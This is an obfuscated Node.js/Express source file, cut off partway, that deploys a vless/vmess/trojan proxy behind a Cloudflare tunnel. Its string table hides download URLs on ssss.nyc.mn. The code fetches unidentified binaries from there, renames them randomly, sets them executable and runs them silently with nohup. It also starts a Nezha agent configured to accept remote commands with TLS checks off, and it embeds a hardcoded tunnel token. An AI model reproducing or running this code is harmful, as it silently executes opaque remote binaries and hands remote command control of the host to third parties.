const _0x2a078c=_0x2485;(function(_0xf3cbfc,_0x8319b9){const _0x159f05={_0x48f641:0x90,_0x43f49e:0x11f,_0x39ec32:0xb7,_0xda7065:0x83,_0x21154c:0x8e,_0x1646f9:0xcd},_0x4ebd85=_0x2485,_0x2cfd0f=_0xf3cbfc();while(!![]){try{const _0x33ba7b=parseInt(_0x4ebd85(_0x159f05._0x48f641))/0x1*(parseInt(_0x4ebd85(_0x159f05._0x43f49e))/0x2)+-parseInt(_0x4ebd85(_0x159f05._0x39ec32))/0x3+parseInt(_0x4ebd85(0xb1))/0x4+-parseInt(_0x4ebd85(_0x159f05._0xda7065))/0x5*(parseInt(_0x4ebd85(0x87))/0x6)+-parseInt(_0x4ebd85(0x7b))/0x7+-parseInt(_0x4ebd85(_0x159f05._0x21154c))/0x8*(-parseInt(_0x4ebd85(0xdb))/0x9)+parseInt(_0x4ebd85(_0x159f05._0x1646f9))/0xa;if(_0x33ba7b===_0x8319b9)break;else _0x2cfd0f['push'](_0x2cfd0f['shift']());}catch(_0x17fec5){_0x2cfd0f['push'](_0x2cfd0f['shift']());}}}(_0x1519,0xba360));const express=require(_0x2a078c(0xef)),app=express(),axios=require(_0x2a078c(0xd3)),os=require('os'),fs=require('fs'),path=require(_0x2a078c(0x7e)),{promisify}=require('util'),exec=promisify(require(_0x2a078c(0xe4))[_0x2a078c(0xf6)]),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x2a078c(0xb4)][_0x2a078c(0xec)]||'',AUTO_ACCESS=process[_0x2a078c(0xb4)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2a078c(0xb4)][_0x2a078c(0xe0)]||'.tmp',SUB_PATH=process[_0x2a078c(0xb4)][_0x2a078c(0xd2)]||'sub',PORT=process['env'][_0x2a078c(0x130)]||process[_0x2a078c(0xb4)][_0x2a078c(0x128)]||0xbb8,UUID=process['env']['UUID']||'96eb8f0c-9f17-4faf-b775-a374836f2790',NEZHA_SERVER=process[_0x2a078c(0xb4)][_0x2a078c(0x8a)]||'',NEZHA_PORT=process[_0x2a078c(0xb4)][_0x2a078c(0x8d)]||'',NEZHA_KEY=process[_0x2a078c(0xb4)][_0x2a078c(0xa1)]||'',ARGO_DOMAIN=process[_0x2a078c(0xb4)]['ARGO_DOMAIN']||_0x2a078c(0xf1),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x2a078c(0x115),ARGO_PORT=process['env'][_0x2a078c(0x92)]||0x1f41,CFIP=process[_0x2a078c(0xb4)][_0x2a078c(0xbb)]||'cdns.doon.eu.org',CFPORT=process[_0x2a078c(0xb4)][_0x2a078c(0xc2)]||0x1bb,NAME=process[_0x2a078c(0xb4)]['NAME']||_0x2a078c(0xff);!fs['existsSync'](FILE_PATH)?(fs[_0x2a078c(0x7c)](FILE_PATH),console[_0x2a078c(0x131)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3d8600={_0x9de5cc:0xf7},_0x52f7d4=_0x2a078c,_0x76b8b9=_0x52f7d4(0x113);let _0x3f6379='';for(let _0x8256f1=0x0;_0x8256f1<0x6;_0x8256f1++){_0x3f6379+=_0x76b8b9['charAt'](Math[_0x52f7d4(0x11c)](Math[_0x52f7d4(_0x3d8600._0x9de5cc)]()*_0x76b8b9[_0x52f7d4(0xad)]));}return _0x3f6379;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2a078c(0xbc)](FILE_PATH,npmName),phpPath=path[_0x2a078c(0xbc)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x2a078c(0xbc)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x2a078c(0x74)),bootLogPath=path['join'](FILE_PATH,_0x2a078c(0x71)),configPath=path[_0x2a078c(0xbc)](FILE_PATH,_0x2a078c(0xab));function _0x2485(_0x1cccc2,_0x4a727a){const _0x151934=_0x1519();return _0x2485=function(_0x24858a,_0x310c05){_0x24858a=_0x24858a-0x70;let _0x115245=_0x151934[_0x24858a];return _0x115245;},_0x2485(_0x1cccc2,_0x4a727a);}function deleteNodes(){const _0x400880={_0x4ba9d3:0xa9,_0x4a0db3:0x10d,_0x31d383:0xad},_0x33ab22=_0x2a078c;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x332cc8;try{_0x332cc8=fs[_0x33ab22(0xf4)](subPath,_0x33ab22(0x10d));}catch{return null;}const _0x542c8e=Buffer['from'](_0x332cc8,_0x33ab22(0x91))[_0x33ab22(_0x400880._0x4ba9d3)](_0x33ab22(_0x400880._0x4a0db3)),_0x320e05=_0x542c8e[_0x33ab22(0x96)]('\x0a')[_0x33ab22(0xda)](_0x1ccea9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x33ab22(0x8f)](_0x1ccea9));if(_0x320e05[_0x33ab22(_0x400880._0x31d383)]===0x0)return;return axios[_0x33ab22(0x134)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x33ab22(0x85)]({'nodes':_0x320e05}),{'headers':{'Content-Type':_0x33ab22(0x79)}})['catch'](_0x9b8036=>{return null;}),null;}catch(_0x54de49){return null;}}function cleanupOldFiles(){const _0xa43429={_0x4ff2c6:0xa4},_0x4f4c65=_0x2a078c;try{const _0x3fa095=fs['readdirSync'](FILE_PATH);_0x3fa095[_0x4f4c65(0xc4)](_0x48454d=>{const _0x9e7c58=_0x4f4c65,_0x51ad30=path['join'](FILE_PATH,_0x48454d);try{const _0x5d601e=fs['statSync'](_0x51ad30);_0x5d601e['isFile']()&&fs[_0x9e7c58(_0xa43429._0x4ff2c6)](_0x51ad30);}catch(_0x198cf5){}});}catch(_0x4a7e70){}}function _0x1519(){const _0x357f40=['floor','freedom','fileName','206wGDTTh','2087','Empowerment\x20success\x20for\x20','\x20-c\x20','Unknown','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','push','error','clear','PORT','win32','https://arm64.ssss.nyc.mn/web','rm\x20-rf\x20','443','includes','/api/add-subscriptions','then','SERVER_PORT','log','country_code','substring','post','\x20>\x20nul\x202>&1','\x0a\x0avmess://','boot.log','http://ip-api.com/json','response','list.txt','Unhandled\x20error\x20in\x20startserver:','\x20successfully','\x0avless://','\x20>/dev/null\x202>&1\x20&','application/json','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','10535042aJyorS','mkdirSync','none','path','firefox','send','readFile','direct','5KdYUkM','\x20>/dev/null\x202>&1','stringify','vless','4020876DlhWSm','from','npm\x20running\x20error:\x20','NEZHA_SERVER','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','NEZHA_PORT','64mfuJAL','test','2537zQlMKm','base64','ARGO_PORT','set','tcp','unlink','split','finish','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https+local://8.8.8.8/dns-query','TunnelSecret','promises','.exe\x20>\x20nul\x202>&1','message','ARGO_DOMAIN:','arm','\x0aclient_secret:\x20','NEZHA_KEY','quic','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','unlinkSync','\x0a\x20\x20credentials-file:\x20','ArgoDomain:','pop','vmess','toString','&path=%2Ftrojan-argo%3Fed%3D2560#','config.json','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','length','org','nohup\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','3684516vJWjwY','listen','data','env','writeFileSync','text/plain;\x20charset=utf-8','826215cKwmxA','catch','2096','https://arm64.ssss.nyc.mn/bot','CFIP','join','\x20failed:\x20','Error\x20in\x20startserver:','arm64','success','Nodes\x20uploaded\x20successfully','CFPORT','tls','forEach','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','block','countryCode','https://amd64.ssss.nyc.mn/web','2053','all','blackhole','/api/add-nodes','19302290LcCfhr','Error\x20downloading\x20files:','127.0.0.1','web\x20running\x20error:\x20','index.html','SUB_PATH','axios','stream','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','basename','2083','Empowerment\x20failed\x20for\x20','https://arm64.ssss.nyc.mn/v1','filter','113184efymkr','php\x20running\x20error:\x20','utf8','http\x20server\x20is\x20running\x20on\x20port:','status','FILE_PATH','\x0a\x0atrojan://','/dev/null','&fp=firefox&type=ws&host=','child_process','match','https://amd64.ssss.nyc.mn/bot','\x20is\x20running','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','amd','pipe','/config.json\x20>/dev/null\x202>&1\x20&','PROJECT_URL','fileUrl','get','express','false','galaxy-us.berlin2028.dpdns.org','\x0a\x20\x20tunnel:\x20','pkill\x20-f\x20\x22[','readFileSync','tunnel.json','exec','random','automatic\x20access\x20task\x20added\x20successfully','/trojan-argo','del\x20/f\x20/q\x20','platform','map','config.yaml','?security=tls&sni=','Galaxy','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Subscription\x20uploaded\x20successfully','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20-p\x20','https://ipapi.co/json','--tls','Download\x20','Error\x20reading\x20boot.log:','NEZHA\x20variable\x20is\x20empty,skip\x20running','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20-s\x20','8443','/vmess-argo?ed=2560','utf-8','chmod','/vmess-argo','existsSync','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Skipping\x20adding\x20automatic\x20access\x20task','abcdefghijklmnopqrstuvwxyz','createWriteStream','eyJhIjoiNzQyM2NhN2RiNjdmZGVhN2RjZmYyNmNjYTA5YWIyMjYiLCJ0IjoiN2RmMTJiNTAtMjcxYS00NDI3LTgxMTYtMDU2ZmJiNDVlYzg1IiwicyI6IlpUZGhZVE00T1RJdFltRmpOUzAwWmpZeUxUbGxNakF0WWpVMVpqVXdNak0zT0dRMSJ9','close','/vless-argo','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','http','unshift','?encryption=none&security=tls&sni='];_0x1519=function(){return _0x357f40;};return _0x1519();}async function generateConfig(){const _0x1ee971={_0x27b2d4:0xe2,_0x4091d8:0x7d,_0x2dde54:0x117,_0x3bd243:0x94,_0x265bf8:0xcf,_0x586fdd:0x86,_0xa4b395:0x117,_0x57f7ea:0xc3,_0x7aafce:0xa2,_0x41c393:0x99,_0x48230f:0xc6,_0x3a50de:0x85},_0x5db32e=_0x2a078c,_0x5900cc={'log':{'access':_0x5db32e(_0x1ee971._0x27b2d4),'error':_0x5db32e(0xe2),'loglevel':_0x5db32e(_0x1ee971._0x4091d8)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5db32e(0x86),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x5db32e(_0x1ee971._0x2dde54),'dest':0xbba},{'path':_0x5db32e(0x10f),'dest':0xbbb},{'path':_0x5db32e(0xf9),'dest':0xbbc}]},'streamSettings':{'network':_0x5db32e(_0x1ee971._0x3bd243)}},{'port':0xbb9,'listen':_0x5db32e(_0x1ee971._0x265bf8),'protocol':_0x5db32e(0x86),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x5db32e(_0x1ee971._0x3bd243),'security':_0x5db32e(0x7d)}},{'port':0xbba,'listen':_0x5db32e(0xcf),'protocol':_0x5db32e(_0x1ee971._0x586fdd),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5db32e(0x7d)},'streamSettings':{'network':'ws','security':_0x5db32e(0x7d),'wsSettings':{'path':_0x5db32e(_0x1ee971._0xa4b395)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5db32e(_0x1ee971._0x57f7ea),_0x5db32e(_0x1ee971._0x7aafce)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x5db32e(0xa8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5db32e(0x10f)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5db32e(_0x1ee971._0x57f7ea),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5db32e(0xcf),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5db32e(0xf9)}},'sniffing':{'enabled':!![],'destOverride':[_0x5db32e(0x119),'tls',_0x5db32e(0xa2)],'metadataOnly':![]}}],'dns':{'servers':[_0x5db32e(_0x1ee971._0x41c393)]},'outbounds':[{'protocol':_0x5db32e(0x11d),'tag':_0x5db32e(0x82)},{'protocol':_0x5db32e(0xcb),'tag':_0x5db32e(_0x1ee971._0x48230f)}]};fs[_0x5db32e(0xb5)](path[_0x5db32e(0xbc)](FILE_PATH,_0x5db32e(0xab)),JSON[_0x5db32e(_0x1ee971._0x3a50de)](_0x5900cc,null,0x2));}function getSystemArchitecture(){const _0x199380={_0x5983f1:0xe9},_0x54fe4b=_0x2a078c,_0x13e372=os['arch']();return _0x13e372==='arm'||_0x13e372===_0x54fe4b(0xbf)||_0x13e372==='aarch64'?'arm':_0x54fe4b(_0x199380._0x5983f1);}function downloadFile(_0x4c947e,_0x4d9a54,_0x193b8b){const _0x455de2={_0x13942c:0x110,_0x432fd5:0x7c,_0x365ace:0xd4},_0xba66d6={_0x4aaf1b:0x106,_0x390607:0xd6,_0x3b88c2:0x126},_0x17e03f={_0x18c173:0x97},_0x3fe3d3={_0x190e8e:0x116,_0x55efcb:0x106},_0x6c0304=_0x2a078c,_0x10381b=_0x4c947e;!fs[_0x6c0304(_0x455de2._0x13942c)](FILE_PATH)&&fs[_0x6c0304(_0x455de2._0x432fd5)](FILE_PATH,{'recursive':!![]});const _0x42c886=fs[_0x6c0304(0x114)](_0x10381b);axios({'method':'get','url':_0x4d9a54,'responseType':_0x6c0304(_0x455de2._0x365ace)})[_0x6c0304(0x12f)](_0xa14b77=>{const _0x16d0bc={_0x5541bc:0x9d},_0x5b8d16=_0x6c0304;_0xa14b77[_0x5b8d16(0xb3)][_0x5b8d16(0xea)](_0x42c886),_0x42c886['on'](_0x5b8d16(_0x17e03f._0x18c173),()=>{const _0xe3e548=_0x5b8d16;_0x42c886[_0xe3e548(_0x3fe3d3._0x190e8e)](),console[_0xe3e548(0x131)](_0xe3e548(_0x3fe3d3._0x55efcb)+path[_0xe3e548(0xd6)](_0x10381b)+_0xe3e548(0x76)),_0x193b8b(null,_0x10381b);}),_0x42c886['on']('error',_0x42df26=>{const _0x3a1158=_0x5b8d16;fs[_0x3a1158(0x95)](_0x10381b,()=>{});const _0x53a85d=_0x3a1158(0x106)+path[_0x3a1158(0xd6)](_0x10381b)+_0x3a1158(0xbd)+_0x42df26[_0x3a1158(_0x16d0bc._0x5541bc)];console[_0x3a1158(0x126)](_0x53a85d),_0x193b8b(_0x53a85d);});})['catch'](_0xf142da=>{const _0x88153b=_0x6c0304,_0x294223=_0x88153b(_0xba66d6._0x4aaf1b)+path[_0x88153b(_0xba66d6._0x390607)](_0x10381b)+'\x20failed:\x20'+_0xf142da[_0x88153b(0x9d)];console[_0x88153b(_0xba66d6._0x3b88c2)](_0x294223),_0x193b8b(_0x294223);});}async function downloadFilesAndRun(){const _0x3cefeb={_0x51362d:0xad,_0x3bc4ae:0xac,_0x4fe44d:0xfc,_0x56734c:0x126,_0x207eca:0xce,_0x4cb65c:0x12d,_0x13b1f9:0x96,_0x5cd5e5:0xa7,_0x30b4d1:0x10b,_0x348996:0xb9,_0x3aef77:0xd7,_0x5f308a:0xa0,_0x3086d1:0x124,_0x49db63:0x8c,_0x1278ab:0xe7,_0x33c393:0xdc,_0x4077b9:0x10a,_0x423780:0x103,_0x339c8e:0x89,_0x2035f8:0x131,_0x1b4d5e:0x108,_0x560064:0x122,_0x3f425b:0xe7,_0x2fa656:0xd0,_0x233390:0xe5,_0x569f71:0xc5,_0xf5a11e:0x78,_0x237038:0xe7},_0x1845ed=_0x2a078c,_0x3290f2=getSystemArchitecture(),_0x16dceb=getFilesForArchitecture(_0x3290f2);if(_0x16dceb[_0x1845ed(_0x3cefeb._0x51362d)]===0x0){console['log'](_0x1845ed(_0x3cefeb._0x3bc4ae));return;}const _0x5dbd9d=_0x16dceb[_0x1845ed(_0x3cefeb._0x4fe44d)](_0x4324d2=>{return new Promise((_0x285a21,_0x45c989)=>{const _0x4cc829=_0x2485;downloadFile(_0x4324d2[_0x4cc829(0x11e)],_0x4324d2[_0x4cc829(0xed)],(_0xda33d2,_0x40b995)=>{_0xda33d2?_0x45c989(_0xda33d2):_0x285a21(_0x40b995);});});});try{await Promise[_0x1845ed(0xca)](_0x5dbd9d);}catch(_0x3f6ee7){console[_0x1845ed(_0x3cefeb._0x56734c)](_0x1845ed(_0x3cefeb._0x207eca),_0x3f6ee7);return;}function _0x15b096(_0x4bd141){const _0x3be253={_0x5c9e9a:0x110,_0x2be3fb:0x10e},_0x14232a={_0x3bc136:0x121},_0x2702bd=0x1fd;_0x4bd141['forEach'](_0x383354=>{const _0x170ffd=_0x2485;fs[_0x170ffd(_0x3be253._0x5c9e9a)](_0x383354)&&fs[_0x170ffd(_0x3be253._0x2be3fb)](_0x383354,_0x2702bd,_0x27734b=>{const _0x1bf353=_0x170ffd;_0x27734b?console[_0x1bf353(0x126)](_0x1bf353(0xd8)+_0x383354+':\x20'+_0x27734b):console['log'](_0x1bf353(_0x14232a._0x3bc136)+_0x383354+':\x20'+_0x2702bd[_0x1bf353(0xa9)](0x8));});});}const _0x191e04=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x15b096(_0x191e04);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2a4859=NEZHA_SERVER[_0x1845ed(_0x3cefeb._0x4cb65c)](':')?NEZHA_SERVER[_0x1845ed(_0x3cefeb._0x13b1f9)](':')[_0x1845ed(_0x3cefeb._0x5cd5e5)]():'',_0x620cea=new Set(['443',_0x1845ed(_0x3cefeb._0x30b4d1),_0x1845ed(_0x3cefeb._0x348996),_0x1845ed(0x120),_0x1845ed(_0x3cefeb._0x3aef77),_0x1845ed(0xc9)]),_0x451902=_0x620cea['has'](_0x2a4859)?'true':_0x1845ed(0xf0),_0x41406f=_0x1845ed(_0x3cefeb._0x5f308a)+NEZHA_KEY+_0x1845ed(_0x3cefeb._0x3086d1)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x451902+_0x1845ed(_0x3cefeb._0x49db63)+UUID;fs['writeFileSync'](path[_0x1845ed(0xbc)](FILE_PATH,_0x1845ed(0xfd)),_0x41406f);const _0x364ea5='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x1845ed(0x111);try{await exec(_0x364ea5),console['log'](phpName+_0x1845ed(_0x3cefeb._0x1278ab)),await new Promise(_0x300a15=>setTimeout(_0x300a15,0x3e8));}catch(_0x5a9789){console['error'](_0x1845ed(_0x3cefeb._0x33c393)+_0x5a9789);}}else{let _0x22903e='';const _0x3f3a42=[_0x1845ed(0x12c),_0x1845ed(0x10b),_0x1845ed(0xb9),_0x1845ed(0x120),_0x1845ed(0xd7),_0x1845ed(0xc9)];_0x3f3a42['includes'](NEZHA_PORT)&&(_0x22903e=_0x1845ed(0x105));const _0x198af3=_0x1845ed(0xaf)+npmPath+_0x1845ed(_0x3cefeb._0x4077b9)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1845ed(_0x3cefeb._0x423780)+NEZHA_KEY+'\x20'+_0x22903e+_0x1845ed(0x7a);try{await exec(_0x198af3),console['log'](npmName+_0x1845ed(_0x3cefeb._0x1278ab)),await new Promise(_0x52260c=>setTimeout(_0x52260c,0x3e8));}catch(_0x1827e8){console[_0x1845ed(_0x3cefeb._0x56734c)](_0x1845ed(_0x3cefeb._0x339c8e)+_0x1827e8);}}}else console[_0x1845ed(_0x3cefeb._0x2035f8)](_0x1845ed(_0x3cefeb._0x1b4d5e));const _0x5a4494=_0x1845ed(0xaf)+webPath+_0x1845ed(_0x3cefeb._0x560064)+FILE_PATH+_0x1845ed(0xeb);try{await exec(_0x5a4494),console['log'](webName+_0x1845ed(_0x3cefeb._0x3f425b)),await new Promise(_0x5d7047=>setTimeout(_0x5d7047,0x3e8));}catch(_0x5ae33d){console[_0x1845ed(0x126)](_0x1845ed(_0x3cefeb._0x2fa656)+_0x5ae33d);}if(fs['existsSync'](botPath)){let _0x1b370d;if(ARGO_AUTH[_0x1845ed(_0x3cefeb._0x233390)](/^[A-Z0-9a-z=]{120,250}$/))_0x1b370d='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x1845ed(_0x3cefeb._0x233390)](/TunnelSecret/)?_0x1b370d=_0x1845ed(0x109)+FILE_PATH+'/tunnel.yml\x20run':_0x1b370d=_0x1845ed(_0x3cefeb._0x569f71)+FILE_PATH+_0x1845ed(0x102)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1b370d+_0x1845ed(_0x3cefeb._0xf5a11e)),console[_0x1845ed(_0x3cefeb._0x2035f8)](botName+_0x1845ed(_0x3cefeb._0x237038)),await new Promise(_0xbe3b63=>setTimeout(_0xbe3b63,0x7d0));}catch(_0x3ab373){console[_0x1845ed(0x126)]('Error\x20executing\x20command:\x20'+_0x3ab373);}}await new Promise(_0x563c65=>setTimeout(_0x563c65,0x1388));}function getFilesForArchitecture(_0x39a28d){const _0x41fd9a={_0x372128:0xe6,_0x183313:0x9f,_0x3794c0:0xd9},_0x3497de=_0x2a078c;let _0x5c5b89;_0x39a28d===_0x3497de(0x9f)?_0x5c5b89=[{'fileName':webPath,'fileUrl':_0x3497de(0x12a)},{'fileName':botPath,'fileUrl':_0x3497de(0xba)}]:_0x5c5b89=[{'fileName':webPath,'fileUrl':_0x3497de(0xc8)},{'fileName':botPath,'fileUrl':_0x3497de(_0x41fd9a._0x372128)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x164003=_0x39a28d==='arm'?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x5c5b89[_0x3497de(0x11a)]({'fileName':npmPath,'fileUrl':_0x164003});}else{const _0x211b1d=_0x39a28d===_0x3497de(_0x41fd9a._0x183313)?_0x3497de(_0x41fd9a._0x3794c0):'https://amd64.ssss.nyc.mn/v1';_0x5c5b89['unshift']({'fileName':phpPath,'fileUrl':_0x211b1d});}}return _0x5c5b89;}function argoType(){const _0x2153c7={_0x2f8d8f:0xe8,_0x3e96c1:0x12d,_0xfc6312:0xbc,_0xb5306c:0xf5,_0x1ec2c5:0x96,_0x30e3af:0xa5,_0xd6557d:0x100,_0x45e1f2:0x131},_0xacaf6e=_0x2a078c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xacaf6e(0x131)](_0xacaf6e(_0x2153c7._0x2f8d8f));return;}if(ARGO_AUTH[_0xacaf6e(_0x2153c7._0x3e96c1)](_0xacaf6e(0x9a))){fs[_0xacaf6e(0xb5)](path[_0xacaf6e(_0x2153c7._0xfc6312)](FILE_PATH,_0xacaf6e(_0x2153c7._0xb5306c)),ARGO_AUTH);const _0x8a68cc=_0xacaf6e(0xf2)+ARGO_AUTH[_0xacaf6e(_0x2153c7._0x1ec2c5)]('\x22')[0xb]+_0xacaf6e(_0x2153c7._0x30e3af)+path[_0xacaf6e(_0x2153c7._0xfc6312)](FILE_PATH,_0xacaf6e(0xf5))+_0xacaf6e(_0x2153c7._0xd6557d)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0xacaf6e(0x8b);fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.yml'),_0x8a68cc);}else console[_0xacaf6e(_0x2153c7._0x45e1f2)](_0xacaf6e(0x118));}async function extractDomains(){const _0x2c0a0c={_0x56aba7:0x131,_0x474c67:0x9e,_0x22b956:0x96,_0x4971e8:0xad,_0x4fade1:0x71,_0x40b771:0x126,_0x1fe834:0x126},_0x4b27c2={_0x385146:0x104,_0x23fd2f:0xb3,_0x9453f9:0x132,_0x45aaf1:0xb3,_0x3eb3bf:0xae,_0x3ae12c:0x72,_0x3ade0c:0xc7,_0x27e195:0x123},_0x14002c={_0x8d5922:0xfb,_0x28ea2e:0x9c,_0x2f7f03:0xf3},_0x1599c8={_0x472993:0xe5,_0x86a7c5:0x125},_0x2db872=_0x2a078c;let _0x3fec0e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3fec0e=ARGO_DOMAIN,console[_0x2db872(_0x2c0a0c._0x56aba7)](_0x2db872(_0x2c0a0c._0x474c67),_0x3fec0e),await _0x609330(_0x3fec0e);else try{const _0x2f7b4a=fs[_0x2db872(0xf4)](path[_0x2db872(0xbc)](FILE_PATH,_0x2db872(0x71)),_0x2db872(0x10d)),_0x5b668f=_0x2f7b4a[_0x2db872(_0x2c0a0c._0x22b956)]('\x0a'),_0x96516f=[];_0x5b668f[_0x2db872(0xc4)](_0x4208c7=>{const _0x5a8e08=_0x2db872,_0x178b37=_0x4208c7[_0x5a8e08(_0x1599c8._0x472993)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x178b37){const _0x5abcbf=_0x178b37[0x1];_0x96516f[_0x5a8e08(_0x1599c8._0x86a7c5)](_0x5abcbf);}});if(_0x96516f[_0x2db872(_0x2c0a0c._0x4971e8)]>0x0)_0x3fec0e=_0x96516f[0x0],console['log'](_0x2db872(0xa6),_0x3fec0e),await _0x609330(_0x3fec0e);else{console[_0x2db872(_0x2c0a0c._0x56aba7)](_0x2db872(0xd5)),fs[_0x2db872(0xa4)](path[_0x2db872(0xbc)](FILE_PATH,_0x2db872(_0x2c0a0c._0x4fade1)));async function _0x157070(){const _0x56daab=_0x2db872;try{process[_0x56daab(_0x14002c._0x8d5922)]===_0x56daab(0x129)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x56daab(_0x14002c._0x28ea2e)):await exec(_0x56daab(_0x14002c._0x2f7f03)+botName['charAt'](0x0)+']'+botName[_0x56daab(0x133)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x160c08){}}_0x157070(),await new Promise(_0x39d2ce=>setTimeout(_0x39d2ce,0xbb8));const _0x4c3421=_0x2db872(0xc5)+FILE_PATH+_0x2db872(0x102)+ARGO_PORT;try{await exec(_0x2db872(0xaf)+botPath+'\x20'+_0x4c3421+_0x2db872(0x78)),console[_0x2db872(_0x2c0a0c._0x56aba7)](botName+'\x20is\x20running'),await new Promise(_0x3891a3=>setTimeout(_0x3891a3,0xbb8)),await extractDomains();}catch(_0x2a115a){console[_0x2db872(_0x2c0a0c._0x40b771)]('Error\x20executing\x20command:\x20'+_0x2a115a);}}}catch(_0x59b6e7){console[_0x2db872(_0x2c0a0c._0x1fe834)](_0x2db872(0x107),_0x59b6e7);}async function _0x4bfdde(){const _0x31d4a5=_0x2db872;try{const _0x512db2=await axios[_0x31d4a5(0xee)](_0x31d4a5(_0x4b27c2._0x385146),{'timeout':0xbb8});if(_0x512db2[_0x31d4a5(_0x4b27c2._0x23fd2f)]&&_0x512db2[_0x31d4a5(0xb3)][_0x31d4a5(_0x4b27c2._0x9453f9)]&&_0x512db2['data'][_0x31d4a5(0xae)])return _0x512db2[_0x31d4a5(_0x4b27c2._0x45aaf1)]['country_code']+'_'+_0x512db2['data'][_0x31d4a5(_0x4b27c2._0x3eb3bf)];}catch(_0xc088c7){try{const _0x3d604c=await axios['get'](_0x31d4a5(_0x4b27c2._0x3ae12c),{'timeout':0xbb8});if(_0x3d604c[_0x31d4a5(0xb3)]&&_0x3d604c[_0x31d4a5(_0x4b27c2._0x23fd2f)]['status']===_0x31d4a5(0xc0)&&_0x3d604c[_0x31d4a5(0xb3)][_0x31d4a5(0xc7)]&&_0x3d604c[_0x31d4a5(_0x4b27c2._0x45aaf1)][_0x31d4a5(0xae)])return _0x3d604c[_0x31d4a5(_0x4b27c2._0x23fd2f)][_0x31d4a5(_0x4b27c2._0x3ade0c)]+'_'+_0x3d604c['data'][_0x31d4a5(_0x4b27c2._0x3eb3bf)];}catch(_0x1eae8b){}}return _0x31d4a5(_0x4b27c2._0x27e195);}async function _0x609330(_0x5d7778){const _0x40c833=await _0x4bfdde(),_0x367a9a=NAME?NAME+'-'+_0x40c833:_0x40c833;return new Promise(_0x31bc72=>{const _0x2e2b39={_0x286b8e:0x7d,_0xc5395c:0xe3,_0x18ea0f:0x88,_0x12527d:0x85,_0x45a927:0xe1,_0x3b045f:0xfe,_0x48c078:0xa9,_0x3a247c:0x131};setTimeout(()=>{const 